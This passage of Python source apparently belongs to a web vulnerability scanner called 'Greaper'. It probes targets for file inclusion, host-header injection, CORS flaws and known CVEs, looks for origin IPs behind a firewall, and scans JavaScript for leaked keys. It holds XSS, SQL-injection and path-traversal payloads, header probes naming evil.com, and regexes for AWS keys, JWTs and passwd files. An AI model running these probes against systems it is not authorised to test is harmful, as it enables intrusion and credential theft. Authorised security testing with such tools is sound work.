        'unix_passwd': (r'root:.*:0:0:', r'nobody:\w+:\d+:\d+:'),
        'win_ini': (r'\[boot loader\]', r'timeout=\d+'),
        'proc_self': (r'Name:\s+\w+\nState:\s+[RSDZT]', r'Pid:\s+\d+'),
        'etc_hosts': (r'127\.0\.0\.1\s+localhost', r'::1\s+localhost'),
        'apache_config': (r'DocumentRoot\s+["\']/\w+', r'<Directory\s+["\']'),
        'nginx_config': (r'worker_processes\s+\w+;', r'http\s*{'),
        'ssh_config': (r'AuthorizedKeysFile', r'PasswordAuthentication\s+(yes|no)'),
    }

    found_vulnerabilities = []
    session = requests.Session()
    session.verify = False

    for payload in payloads:
        lfi_test_url = target.replace("FUZZ", payload)
        try:
            response = session.get(
                lfi_test_url,
                timeout=10,
                allow_redirects=False
            )

            # Skip if response is too similar to baseline
            if (abs(len(response.text) - baseline_length) < 10 or
                response.text == baseline_content or
                response.status_code == 404):
                print(f"{COLOR_RED}[-] No LFI found for payload: {payload}{COLOR_RESET}")
                continue

            # Enhanced validation with multiple pattern matching
            found_patterns = []
            for file_type, patterns in lfi_patterns.items():
                if all(re.search(pattern, response.text) for pattern in patterns):
                    found_patterns.append(file_type)

            if found_patterns:
                result = f"{COLOR_GREEN}[+] Potential LFI found on {lfi_test_url}  With file: {payload}{COLOR_RESET}"
                print(result)
                # Store result without color codes for file output
                found_vulnerabilities.append(f"[+] Potential LFI found on {lfi_test_url}  With file: {payload}")
            else:
                print(f"{COLOR_RED}[-] No LFI found for payload: {payload}{COLOR_RESET}")

        except requests.RequestException:
            print(f"{COLOR_RED}[-] No LFI found for payload: {payload}{COLOR_RESET}")
            continue

    # Print summary and handle file output
    print(f"\n{COLOR_BLUE}[*] Scan Summary:{COLOR_RESET}")
    if found_vulnerabilities:
        print(f"{COLOR_GREEN}[+] Found {len(found_vulnerabilities)} potential LFI vulnerabilities{COLOR_RESET}")
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write('\n'.join(found_vulnerabilities) + '\n')
                print(f"{COLOR_BLUE}[*] Results saved to {output_file}{COLOR_RESET}")
            except Exception as e:
                print(f"{COLOR_RED}[-] Error saving results: {str(e)}{COLOR_RESET}")
    else:
        print(f"{COLOR_RED}[-] No LFI vulnerabilities found{COLOR_RESET}")

def dynamic_payload_generator(target, scan_type, output_file=None):
    print(f"[*] Running Greaper Dynamic Payload Generation on {target}")
    
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.content, 'html.parser')

        forms = soup.find_all('form')
        print(f"[*] Found {len(forms)} forms on the page.")

        if not forms:
            print(f"{COLOR_RED}[-] No forms found on {target}{COLOR_RESET}")

        results = []
        for form in forms:
            action = form.get('action') or target
            method = form.get('method', 'get').lower()

            inputs = form.find_all('input')
            print(f"[*] Form action: {action}, method: {method}")

            for input_tag in inputs:
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                
                if input_type == 'text':
                    payload = "<script>alert(1)</script>"
                    result = f"{COLOR_GREEN}[+] Generated XSS payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)
                elif input_type == 'number':
                    payload = "' OR 1=1 --"
                    result = f"{COLOR_GREEN}[+] Generated SQLi payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)
                elif input_type == 'file':
                    payload = "../../../../etc/passwd"
                    result = f"{COLOR_GREEN}[+] Generated LFI payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)
                else:
                    payload = "FUZZ"
                    result = f"{COLOR_GREEN}[+] Generated default payload for input '{input_name}': {payload}{COLOR_RESET}"
                    print(result)
                    results.append(result)

        save_results(output_file, results)
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error crawling the site: {str(e)}{COLOR_RESET}")

def greaper_host_header_scan(target, output_file=None):
    """Enhanced Host Header Injection scanner with multiple validation checks"""
    print(f"\n{COLOR_BLUE}[*] Starting Greaper Host Header Injection scanner on {target}{COLOR_RESET}")
    
    # Test multiple malicious headers and payloads
    test_cases = [
        {
            'Host': 'evil.com',
            'X-Forwarded-Host': 'evil.com'
        },
        {
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com'
        },
        {
            'X-Original-Host': 'evil.com',
            'X-Rewrite-URL': 'evil.com'
        }
    ]

    # Get baseline response for comparison
    try:
        baseline_response = requests.get(target)
        baseline_content = baseline_response.text
        baseline_headers = baseline_response.headers
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error getting baseline response: {str(e)}{COLOR_RESET}")
        return

    found_hhi = False
    results = []

    for test_case in test_cases:
        try:
            response = requests.get(target, headers=test_case, allow_redirects=False)
            
            # Multiple validation checks to reduce false positives
            indicators = {
                'content_changed': abs(len(response.text) - len(baseline_content)) > 100,
                'headers_reflected': any(
                    'evil.com' in str(v).lower() 
                    for v in response.headers.values()
                ),
                'body_reflected': 'evil.com' in response.text.lower(),
                'status_changed': response.status_code != baseline_response.status_code,
                'location_header': 'evil.com' in response.headers.get('Location', '').lower()
            }

            # Require multiple indicators for higher confidence
            confidence_score = sum(1 for v in indicators.values() if v)
            
            if confidence_score >= 2:  # Require at least 2 indicators
                result = (
                    f"{COLOR_GREEN}[+] Host Header Injection found on {target}\n"
                    f"    Confidence Score: {confidence_score}/5\n"
                    f"    Triggered Headers: {list(test_case.keys())}\n"
                    f"    Indicators: {[k for k, v in indicators.items() if v]}{COLOR_RESET}"
                )
                print(result)
                found_hhi = True
                results.append(result)
                break  # Stop testing if vulnerability is found with high confidence

        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Error testing {list(test_case.keys())}: {str(e)}{COLOR_RESET}")
            continue

    if not found_hhi:
        print(f"{COLOR_RED}[-] No Host Header Injection vulnerabilities found{COLOR_RESET}")
    
    save_results(output_file, results)

def greaper_cors_scan(target, output_file=None):
    """Enhanced CORS misconfiguration scanner with comprehensive checks"""
    print(f"\n{COLOR_BLUE}[*] Starting Greaper CORS scanner on {target}{COLOR_RESET}")
    
    # Test domains for CORS validation
    test_origins = [
        'evil.com',
        'null',
        'https://attacker.com',
        'http://localhost',
        target.replace('https://', 'http://'),  # Test protocol switching
        f"https://evil.{urlparse(target).netloc}"  # Test subdomain
    ]
    
    found_cors = False
    results = []
    
    try:
        # Get baseline response
        baseline = requests.get(target)
        
        for origin in test_origins:
            headers = {'Origin': origin}
            try:
                response = requests.get(target, headers=headers)
                cors_headers = {
                    'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                    'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                    'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
                    'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers')
                }
                
                # Enhanced vulnerability checks
                vulnerabilities = []
                
                if cors_headers['Access-Control-Allow-Origin']:
                    acao = cors_headers['Access-Control-Allow-Origin']
                    
                    # Check for dangerous configurations
                    if acao == '*' and cors_headers['Access-Control-Allow-Credentials'] == 'true':
                        vulnerabilities.append('Wildcard origin with credentials')
                    elif origin in acao and origin != urlparse(target).netloc:
                        vulnerabilities.append(f'Origin reflection: {origin}')
                    elif acao == 'null':
                        vulnerabilities.append('null origin allowed')
                    elif not acao.startswith(('http://', 'https://')):
                        vulnerabilities.append(f'Invalid ACAO header: {acao}')
                    
                    # Check for dangerous method combinations
                    if cors_headers['Access-Control-Allow-Methods']:
                        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
                        allowed_methods = cors_headers['Access-Control-Allow-Methods'].upper().split(',')
                        dangerous_allowed = [m for m in dangerous_methods if m in allowed_methods]
                        if dangerous_allowed:
                            vulnerabilities.append(f'Dangerous methods allowed: {dangerous_allowed}')
                
                if vulnerabilities:
                    result = (
                        f"{COLOR_GREEN}[+] CORS Misconfiguration found on {target}\n"
                        f"    Testing Origin: {origin}\n"
                        f"    Vulnerabilities:\n"
                        f"    - " + "\n    - ".join(vulnerabilities) + "\n"
                        f"    CORS Headers:\n"
                        f"    - " + "\n    - ".join(f"{k}: {v}" for k, v in cors_headers.items() if v) +
                        f"{COLOR_RESET}"
                    )
                    print(result)
                    found_cors = True
                    results.append(result)
            
            except requests.RequestException as e:
                print(f"{COLOR_ORANGE}[-] Error testing origin {origin}: {str(e)}{COLOR_RESET}")
                continue
    
    except requests.RequestException as e:
        print(f"{COLOR_ORANGE}[-] Error scanning {target}: {str(e)}{COLOR_RESET}")
    
    if not found_cors:
        print(f"{COLOR_RED}[-] No CORS Misconfiguration vulnerabilities found{COLOR_RESET}")
    
    save_results(output_file, results)

def validate_bypass_response(response, domain):
    """
    Validate if the response indicates a successful WAF bypass
    Returns True if bypass appears successful, False otherwise
    """
    try:
        # Check if we got a valid response
        if response.status_code in [200, 301, 302, 307, 308]:
            # Check if response contains expected domain content
            if domain.lower() in response.text.lower():
                # Check response size (avoid error pages)
                if len(response.content) > 1000:  # Arbitrary threshold
                    return True
                    
        # Additional checks for specific WAF bypass indicators
        server_header = response.headers.get('Server', '').lower()
        if any(indicator in server_header for indicator in ['nginx', 'apache', 'cloudflare-nginx']):
            return True
            
        # Check for common WAF fingerprints in headers
        waf_headers = ['x-firewall', 'x-cdn', 'x-proxy-cache']
        if not any(header in response.headers.keys() for header in waf_headers):
            return True
            
    except Exception:
        pass
    
    return False

def greaper_ip_lookup_bypass(target, output_file=None):
    """
    Enhanced IP lookup with ASN information and comprehensive IP discovery
    """
    print(f"\n{COLOR_BLUE}[*] Starting Greaper advanced IP lookup for {target}{COLOR_RESET}")
    results = []
    output_results = []  # Separate list for file output without color codes

    # Clean up target input
    target = target.strip().lower()
    if not target.startswith(('http://', 'https://')):
        target = f'https://{target}'
    
    parsed_url = urlparse(target)
    domain = parsed_url.netloc.split(':')[0]

    try:
        # Suppress SSL warnings
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # 1. First get ASN information
        print(f"\n{COLOR_BLUE}[*] Looking up ASN information...{COLOR_RESET}")
        asn_info = get_asn_info(domain)
        if asn_info:
            for asn_data in asn_info:
                asn_result = (
                    f"{COLOR_GREEN}[+] Found ASN: {asn_data['asn']}\n"
                    f"    Organization: {asn_data['org']}\n"
                    f"    Network Range: {asn_data['network']}\n"
                    f"    Country: {asn_data['country']}{COLOR_RESET}"
                )
                print(asn_result)
                # Store without color codes for file output
                output_results.append(
                    f"[+] Found ASN: {asn_data['asn']}\n"
                    f"    Organization: {asn_data['org']}\n"
                    f"    Network Range: {asn_data['network']}\n"
                    f"    Country: {asn_data['country']}"
                )

        # 2. Get IPs from multiple sources
        print(f"\n{COLOR_BLUE}[*] Gathering IP addresses from multiple sources...{COLOR_RESET}")
        ip_addresses = set()
        
        # DNS Resolution
        try:
            answers = dns.resolver.resolve(domain, 'A')
            for rdata in answers:
                ip_addresses.add(str(rdata))
        except dns.resolver.NXDOMAIN:
            print(f"{COLOR_RED}[-] Domain does not exist{COLOR_RESET}")
        except dns.resolver.NoAnswer:
            print(f"{COLOR_RED}[-] No A records found{COLOR_RESET}")

        # Reverse DNS lookup for associated IPs
        for ip in list(ip_addresses):  # Create a copy of the set for iteration
            try:
                reverse_domains = socket.gethostbyaddr(ip)
                if reverse_domains and reverse_domains[0]:
                    try:
                        new_ips = [str(rdata) for rdata in dns.resolver.resolve(reverse_domains[0], 'A')]
                        ip_addresses.update(new_ips)
                    except:
                        pass
            except:
                continue

        # Get IPs from SSL certificate (if available)
        ssl_ips = get_ssl_ips(domain)
        ip_addresses.update(ssl_ips)

        if not ip_addresses:
            print(f"{COLOR_RED}[-] No IP addresses found for {domain}{COLOR_RESET}")
            return

        if ip_addresses:
            ip_result = f"\n[+] Found {len(ip_addresses)} unique IP addresses:"
            print(f"{COLOR_GREEN}{ip_result}{COLOR_RESET}")
            output_results.append(ip_result)
            
            for ip in sorted(ip_addresses):
                print(f"{COLOR_GREEN}    - {ip}{COLOR_RESET}")
                output_results.append(f"    - {ip}")

            # Test each IP for WAF bypass
            for ip in ip_addresses:
                print(f"\n{COLOR_BLUE}[*] Testing IP: {ip}{COLOR_RESET}")
                
                headers = {
                    'Host': domain,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }

                for protocol in ['https', 'http']:
                    try:
                        url = f"{protocol}://{ip}"
                        response = requests.get(
                            url, 
                            headers=headers, 
                            timeout=10,
                            verify=False,
                            allow_redirects=False
                        )

                        if validate_bypass_response(response, domain):
                            bypass_result = (
                                f"[+] Potential WAF bypass found!\n"
                                f"    IP: {ip}\n"
                                f"    Protocol: {protocol.upper()}\n"
                                f"    Status Code: {response.status_code}\n"
                                f"    Response Size: {len(response.content)} bytes"
                            )
                            print(f"{COLOR_GREEN}{bypass_result}{COLOR_RESET}")
                            output_results.append(bypass_result)

                    except requests.RequestException:
                        continue

        # Save results to file if specified
        if output_file and output_results:
            try:
                with open(output_file, 'w') as f:
                    f.write('\n'.join(output_results))
                print(f"\n{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")
            except Exception as e:
                print(f"\n{COLOR_RED}[-] Error saving results to {output_file}: {str(e)}{COLOR_RESET}")
        
        # Print summary
        if output_results:
            print(f"\n{COLOR_GREEN}[+] Found {len(output_results)} results{COLOR_RESET}")
        else:
            print(f"\n{COLOR_RED}[-] No results found{COLOR_RESET}")

    except Exception as e:
        print(f"\n{COLOR_RED}[-] Error during lookup: {str(e)}{COLOR_RESET}")

def get_asn_info(domain):
    """
    Get ASN information for a domain using various sources
    """
    try:
        # Try ipwhois first
        ip = socket.gethostbyname(domain)
        obj = IPWhois(ip)
        results = obj.lookup_rdap()
        
        asn_info = [{
            'asn': results.get('asn'),
            'org': results.get('network', {}).get('name'),
            'network': results.get('network', {}).get('cidr'),
            'country': results.get('asn_country_code')
        }]
        
        # Try additional ASN lookup services
        try:
            # BGP.HE.NET lookup (using their API if available)
            response = requests.get(f"https://bgp.he.net/ip/{ip}", headers={
                'User-Agent': 'Mozilla/5.0'
            })
            if response.status_code == 200:
                # Parse response for additional ASN info
                # Note: This is a placeholder as BGP.HE.NET requires proper API access
                pass
        except:
            pass

        return asn_info

    except Exception as e:
        print(f"{COLOR_RED}[-] Error getting ASN info: {str(e)}{COLOR_RESET}")
        return None

def get_ssl_ips(domain):
    """
    Get IP addresses from SSL certificate
    """
    ips = set()
    try:
        # Try to get SSL certificate
        context = ssl.create_default_context()
        with context.wrap_socket(socket.socket(), server_hostname=domain) as sock:
            sock.connect((domain, 443))
            cert = sock.getpeercert()
            
            # Extract alternative names from certificate
            for type_, value in cert.get('subjectAltName', []):
                if type_ == 'DNS':
                    try:
                        cert_ips = [str(rdata) for rdata in dns.resolver.resolve(value, 'A')]
                        ips.update(cert_ips)
                    except:
                        continue
    except:
        pass
    
    return ips

def scan_js_files(target, output_file=None):
    """Main function to scan JavaScript files"""
    print(f"\n{COLOR_BLUE}[*] Starting JavaScript scanner for {target}{COLOR_RESET}")
    
    if is_js_file(target):
        # Direct JS file analysis
        analyze_js(target, output_file)
    else:
        # Extract and analyze JS files from webpage
        js_urls = extract_js_urls(target)
        if js_urls:
            print(f"\n{COLOR_BLUE}[*] Found {len(js_urls)} JavaScript files to analyze{COLOR_RESET}")
            for js_url in js_urls:
                analyze_js(js_url, output_file)
        else:
            print(f"{COLOR_RED}[-] No JavaScript files found on {target}{COLOR_RESET}")

def analyze_js(js_url, output_file=None):
    """Analyze JavaScript file for sensitive information"""
    try:
        # Configure session with timeout and SSL verification disabled
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*'
        })

        # Try to fetch the JavaScript content
        try:
            response = session.get(js_url, timeout=10)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"{COLOR_RED}[-] Failed to fetch {js_url}: {str(e)}{COLOR_RESET}")
            return False

        js_content = response.text

        # Define patterns to search for (simplified and focused)
        patterns = {
            'API Key': r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']',
            'AWS Key': r'AKIA[0-9A-Z]{16}',
            'Database URL': r'(?:mongodb|mysql|postgresql|redis)://[^\s<>"\']+',
            'Internal IP': r'\b(?:127\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|10\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',
            'S3 Bucket': r'[a-z0-9.-]+\.s3\.amazonaws\.com',
            'JWT Token': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            'Google API Key': r'AIza[0-9A-Za-z-_]{35}',
            'Secret Key': r'(?:secret|private)[_-]?key["\']?\s*[:=]\s*["\'][^"\']+["\']'
        }

        findings = []
        lines = js_content.splitlines()

        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in patterns.items():
                matches = re.finditer(pattern, line)
                for match in matches:
                    # Get context (just one line before and after)
                    start = max(0, line_num - 1)
                    end = min(len(lines), line_num + 2)
                    context = lines[start:end]
                    
                    findings.append({
                        'type': pattern_name,
                        'line': line_num,
                        'content': match.group(0),
                        'context': context
                    })

        if findings:
            # Group findings by type for cleaner output
            findings_by_type = {}
            for finding in findings:
                if finding['type'] not in findings_by_type:
                    findings_by_type[finding['type']] = []  # Fixed: Proper dictionary assignment
                findings_by_type[finding['type']].append(finding)

            # Print findings
            print(f"\n{COLOR_GREEN}[+] Found sensitive information in {js_url}{COLOR_RESET}")
            
            # Save to file if specified
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(f"\n{'='*50}\n")
                    f.write(f"JavaScript File: {js_url}\n")
                    f.write(f"{'='*50}\n\n")
                    
                    for finding_type, type_findings in findings_by_type.items():
                        f.write(f"{finding_type} ({len(type_findings)} found):\n")
                        f.write("-" * 40 + "\n")
                        
                        for finding in type_findings:
                            f.write(f"Line {finding['line']}:\n")
                            for i, ctx_line in enumerate(finding['context']):
                                if i == 1:  # The actual finding line
                                    f.write(f"  → {ctx_line.strip()}\n")
                                else:
                                    f.write(f"    {ctx_line.strip()}\n")
                            f.write("\n")
                        f.write("\n")

                print(f"{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")

            # Print summary to console
            for finding_type, type_findings in findings_by_type.items():
                print(f"\n{COLOR_BLUE}[*] {finding_type} ({len(type_findings)} found):{COLOR_RESET}")
                for finding in type_findings[:3]:  # Show only first 3 findings per type
                    print(f"  Line {finding['line']}: {finding['content'][:100]}...")
                if len(type_findings) > 3:
                    print(f"  ... and {len(type_findings) - 3} more")

            return True
        else:
            print(f"{COLOR_GREY}[-] No sensitive information found in {js_url}{COLOR_RESET}")
            return False

    except Exception as e:
        print(f"{COLOR_RED}[-] Error analyzing {js_url}: {str(e)}{COLOR_RESET}")
        return False

def extract_js_urls(url):
    """Extract JavaScript URLs from a webpage"""
    js_urls = set()
    session = get_session()
    
    try:
        print(f"\n{COLOR_BLUE}[*] Scanning {url} for JavaScript files...{COLOR_RESET}")
        print(f"{COLOR_BLUE}{'─' * 60}{COLOR_RESET}")
        
        response = safe_request(url, session)
        if not response:
            return []

        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Find script tags and potential JS files
        for tag in soup.find_all(['script', 'link', 'a']):
            js_url = tag.get('src') or tag.get('href')
            if js_url:
                if js_url.startswith('//'):
                    js_url = 'https:' + js_url
                elif js_url.startswith('/'):
                    js_url = urljoin(url, js_url)
                elif not js_url.startswith(('http://', 'https://')):
                    js_url = urljoin(url, js_url)
                
                if is_js_file(js_url):
                    js_urls.add(js_url)

        if js_urls:
            print(f"\n{COLOR_GREEN}[+] Found {len(js_urls)} JavaScript files:{COLOR_RESET}")
            for i, js_url in enumerate(sorted(js_urls), 1):
                print(f"{COLOR_BLUE}    {i:2d}. {js_url}{COLOR_RESET}")
        else:
            print(f"\n{COLOR_ORANGE}[!] No JavaScript files found{COLOR_RESET}")

        print(f"\n{COLOR_BLUE}{'─' * 60}{COLOR_RESET}")
        return list(js_urls)

    except Exception as e:
        print(f"{COLOR_RED}[✗] Error: {str(e)}{COLOR_RESET}")
        return []

def is_js_file(url):
    """Check if a URL points to a JavaScript file"""
    if not url:
        return False
    
    # Common JS patterns
    js_patterns = [
        r'\.js($|\?)',           # Ends with .js or .js?
        r'\.js/[^/]*$',          # .js/ followed by anything except /
        r'/js/[^/]+$',           # /js/ followed by anything except /
        r'[^/]+\.js\b',          # Anything ending in .js
        r'/javascript/',         # Contains /javascript/
        r'type=text/javascript'  # Contains type=text/javascript
    ]
    
    url_lower = url.lower()
    return any(re.search(pattern, url_lower) for pattern in js_patterns)

def check_security_headers(url, output_file=None):
    """Enhanced security header scanner with comprehensive header checks"""
    print(f"\n{COLOR_BLUE}[*] Starting security header scanner for {url}{COLOR_RESET}")
    
    # Expanded list of security headers with descriptions
    required_headers = {
        'Strict-Transport-Security': {
            'description': 'Enforces HTTPS connections',
            'recommended': 'max-age=31536000; includeSubDomains; preload'
        },
        'Content-Security-Policy': {
            'description': 'Controls resource loading',
            'recommended': "default-src 'self'"
        },
        'X-Frame-Options': {
            'description': 'Prevents clickjacking attacks',
            'recommended': 'SAMEORIGIN'
        },
        'X-Content-Type-Options': {
            'description': 'Prevents MIME-type sniffing',
            'recommended': 'nosniff'
        },
        'Referrer-Policy': {
            'description': 'Controls referrer information',
            'recommended': 'strict-origin-when-cross-origin'
        },
        'Permissions-Policy': {
            'description': 'Controls browser features',
            'recommended': 'geolocation=(), microphone=()'
        },
        'X-XSS-Protection': {
            'description': 'Legacy XSS protection',
            'recommended': '1; mode=block'
        },
        # Additional headers
        'Cross-Origin-Opener-Policy': {
            'description': 'Controls window.opener behavior',
            'recommended': 'same-origin'
        },
        'Cross-Origin-Resource-Policy': {
            'description': 'Controls resource sharing',
            'recommended': 'same-origin'
        },
        'Cross-Origin-Embedder-Policy': {
            'description': 'Controls resource loading',
            'recommended': 'require-corp'
        },
        'Cache-Control': {
            'description': 'Controls caching behavior',
            'recommended': 'no-store, max-age=0'
        },
        'Clear-Site-Data': {
            'description': 'Clears browsing data',
            'recommended': '"*"'
        },
        'Access-Control-Allow-Origin': {
            'description': 'Controls CORS',
            'recommended': 'null or specific origin'
        },
        'Feature-Policy': {
            'description': 'Legacy browser feature control',
            'recommended': "camera 'none'; microphone 'none'"
        }
    }

    try:
        # Make request with extended timeout and SSL verification disabled
        response = requests.get(url, timeout=10, verify=False)
        headers = response.headers
        
        results = [f"Security Header Scan Results for {url}\n{'='*50}\n"]
        found_headers = 0
        missing_headers = 0

        # Check each security header
        for header, info in required_headers.items():
            if header in headers:
                found_headers += 1
                value = headers[header]
                result = (
                    f"{COLOR_GREEN}[+] {header}{COLOR_RESET}\n"
                    f"    Value: {value}\n"
                    f"    Description: {info['description']}\n"
                    f"    Recommended: {info['recommended']}"
                )
                print(result)
                # Store without color codes for file output
                results.append(
                    f"[+] {header}\n"
                    f"    Value: {value}\n"
                    f"    Description: {info['description']}\n"
                    f"    Recommended: {info['recommended']}"
                )
            else:
                missing_headers += 1
                result = (
                    f"{COLOR_ORANGE}[-] {header} is missing{COLOR_RESET}\n"
                    f"    Description: {info['description']}\n"
                    f"    Recommended: {info['recommended']}"
                )
                print(result)
                # Store without color codes for file output
                results.append(
                    f"[-] {header} is missing\n"
                    f"    Description: {info['description']}\n"
                    f"    Recommended: {info['recommended']}"
                )

        # Add summary
        summary = (
            f"\nScan Summary\n{'-'*20}\n"
            f"Total Headers Checked: {len(required_headers)}\n"
            f"Headers Present: {found_headers}\n"
            f"Headers Missing: {missing_headers}\n"
            f"Security Score: {(found_headers/len(required_headers))*100:.1f}%"
        )
        print(f"{COLOR_BLUE}{summary}{COLOR_RESET}")
        results.append(summary)

        # Save results if output file is specified
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write('\n\n'.join(results))
                print(f"\n{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")
            except Exception as e:
                print(f"\n{COLOR_RED}[-] Error saving results: {str(e)}{COLOR_RESET}")

    except requests.RequestException as e:
        error_msg = f"{COLOR_RED}[-] Error checking security headers: {str(e)}{COLOR_RESET}"
        print(error_msg)
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write(f"Error checking security headers for {url}: {str(e)}")
            except Exception as write_err:
                print(f"{COLOR_RED}[-] Error saving error message: {str(write_err)}{COLOR_RESET}")

def cve_scan_by_fingerprint(url, output_file=None, auth=None):
    """Enhanced CVE scanner with comprehensive framework detection"""
    print(f"\n{COLOR_BLUE}[*] Starting Enhanced Greaper CVE Scanner on {url}{COLOR_RESET}\n")
    vulnerability_tests = {
        # ... existing vulnerabilities ...

        # Drupal Vulnerabilities
        'CVE-2023-39615': {
            'paths': ['/user/login', '/user/register'],
            'methods': ['POST'],
            'params': {'form_id': 'user_login_form'},
            'version_pattern': r'Drupal (\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('10.0.9'),
            'test': lambda r: 'drupal' in r.headers.get('X-Generator', '').lower(),
            'severity': 'Critical',
            'description': 'Drupal Remote Code Execution',
            'validation': lambda r: 'Drupal.settings' in r.text
        },

        # Joomla Vulnerabilities
        'CVE-2023-23752': {
            'paths': ['/api/index.php/v1/config/application'],
            'methods': ['GET'],
            'version_pattern': r'Joomla!? (\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('4.2.8'),
            'test': lambda r: r.status_code == 200 and 'joomla' in r.text.lower(),
            'severity': 'Critical',
            'description': 'Joomla Unauthenticated Information Disclosure',
            'validation': lambda r: 'com_users' in r.text
        },

        # Magento Vulnerabilities
        'CVE-2022-24086': {
            'paths': ['/admin', '/index.php/admin'],
            'methods': ['POST'],
            'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
            'version_pattern': r'Magento/(\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('2.4.3-p2'),
            'test': lambda r: 'magento' in r.headers.get('X-Magento-Tags', '').lower(),
            'severity': 'Critical',
            'description': 'Magento Remote Code Execution'
        },

        # Jenkins Vulnerabilities
        'CVE-2023-27898': {
            'paths': ['/script', '/scriptText'],
            'methods': ['GET'],
            'version_pattern': r'Jenkins/(\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('2.387'),
            'test': lambda r: 'Jenkins' in r.headers.get('X-Jenkins', ''),
            'severity': 'Critical',
            'description': 'Jenkins Script Security Bypass'
        },

        # Kubernetes API Server
        'CVE-2023-2727': {
            'paths': ['/api/v1/namespaces', '/apis'],
            'methods': ['GET'],
            'headers': {'Authorization': 'Bearer invalid_token'},
            'test': lambda r: r.status_code == 401 and 'k8s' in r.headers.get('Server', ''),
            'severity': 'Critical',
            'description': 'Kubernetes API Server Vulnerability'
        },

        # GitLab Vulnerabilities
        'CVE-2023-2825': {
            'paths': ['/api/v4/projects', '/explore'],
            'methods': ['GET'],
            'version_pattern': r'GitLab (\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('16.0.1'),
            'test': lambda r: 'gitlab' in r.headers.get('X-Runtime', '').lower(),
            'severity': 'High',
            'description': 'GitLab Remote Code Execution'
        },

        # Confluence Vulnerabilities
        'CVE-2023-22515': {
            'paths': ['/setup/setupadministrator.action'],
            'methods': ['GET', 'POST'],
            'version_pattern': r'Confluence (\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('8.4.5'),
            'test': lambda r: 'confluence' in r.text.lower(),
            'severity': 'Critical',
            'description': 'Confluence Authentication Bypass'
        },

        # Elasticsearch Vulnerabilities
        'CVE-2023-31419': {
            'paths': ['/_cat/indices', '/_cluster/health'],
            'methods': ['GET'],
            'version_pattern': r'elasticsearch/(\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('8.8.2'),
            'test': lambda r: 'elasticsearch' in r.headers.get('X-elastic-product', '').lower(),
            'severity': 'High',
            'description': 'Elasticsearch Information Disclosure'
        },

        # Redis Vulnerabilities
        'CVE-2023-28425': {
            'paths': ['/', '/%2A1%0D%0A%244%0D%0AINFO%0D%0A'],
            'methods': ['GET'],
            'headers': {
                'Connection': 'Upgrade',
                'Upgrade': 'REDIS'
            },
            'test': lambda r: any(
                indicator in r.text.lower() 
                for indicator in [
                    'redis_version',
                    'redis_mode',
                    'tcp_port'
                ]
            ),
            'severity': 'High',
            'description': 'Redis Unauthorized Access'
        },

        # MongoDB Vulnerabilities
        'CVE-2023-28466': {
            'paths': ['/'],
            'methods': ['GET'],
            'headers': {'Connection': 'Upgrade'},
            'test': lambda r: 'mongodb' in r.headers.get('Server', '').lower(),
            'severity': 'High',
            'description': 'MongoDB Information Disclosure'
        },

        # Spring Boot Actuator
        'SPRING-ACTUATOR': {
            'paths': [
                '/actuator',
                '/actuator/env',
                '/actuator/health',
                '/actuator/metrics'
            ],
            'methods': ['GET'],
            'test': lambda r: r.status_code == 200 and 'spring-boot' in r.text.lower(),
            'severity': 'High',
            'description': 'Spring Boot Actuator Exposure'
        },

        # GraphQL Vulnerabilities
        'GRAPHQL-INTROSPECTION': {
            'paths': ['/graphql', '/api/graphql'],
            'methods': ['POST'],
            'params': {
                'query': '''
                query {
                    __schema {
                        types {
                            name
                            fields {
                                name
                            }
                        }
                    }
                }
                '''
            },
            'test': lambda r: '__schema' in r.text and r.status_code == 200,
